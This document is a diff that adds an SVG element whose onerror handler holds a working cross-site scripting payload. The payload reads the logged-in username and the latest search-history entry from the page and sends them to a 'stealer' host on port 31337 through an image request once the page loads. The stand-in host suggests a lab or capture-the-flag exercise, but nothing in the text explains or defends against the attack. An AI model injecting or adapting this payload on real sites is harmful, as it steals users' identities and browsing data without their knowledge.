@@ -1,0 +1,37 @@
+<svg onerror="(function(){
+  const strip = s => (s||'').trim().replace(/[.,;:!?]+$/, '');
+  const isValidSearchTerm = s =>
+    typeof s === 'string' && s.trim().length > 0 && !/[<%]/.test(s) && /[A-Za-z0-9]/.test(s);
+
+  function getUsername(){
+    const bodyText = document.body && document.body.innerText || '';
+    const m = bodyText.match(/Logged in as\s+([^\n]+)/i);
+    return m ? strip(m[1]) : '';
+  }
+
+  function getLastSearchFromHistory(){
+    const historyContainer = document.getElementById('history-list');
+    if (!historyContainer) return '';
+    const historyLinks = historyContainer.querySelectorAll('a');
+    for (const link of historyLinks){
+      const linkText = (link.textContent || '').trim();
+      if (isValidSearchTerm(linkText)) return linkText.split(/\r?\n/)[0].trim();
+    }
+    return '';
+  }
+
+  function sendToStealer(username, search){
+    new Image().src = 'http://stealer:31337/?stolen_user=' + encodeURIComponent(username||'') +
+                      '&last_search=' + encodeURIComponent(search||'');
+  }
+
+  function run(){
+    sendToStealer(getUsername(), getLastSearchFromHistory());
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', ()=>setTimeout(run,100), {once:true});
+  } else {
+    setTimeout(run,100);
+  }
+})()"></svg>
